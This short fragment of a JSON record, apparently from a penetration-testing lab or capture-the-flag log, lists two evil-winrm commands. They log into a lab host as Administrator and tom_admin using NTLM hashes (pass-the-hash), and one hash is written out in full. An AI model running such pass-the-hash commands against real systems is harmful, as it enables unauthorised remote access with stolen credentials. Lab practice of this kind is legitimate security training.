        "evil-winrm -i 10.10.x.152 -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5",
        "evil-winrm -i 10.10.x.152 -u tom_admin -H '<tom_admin_hash>'"
      ]
    }
  ],

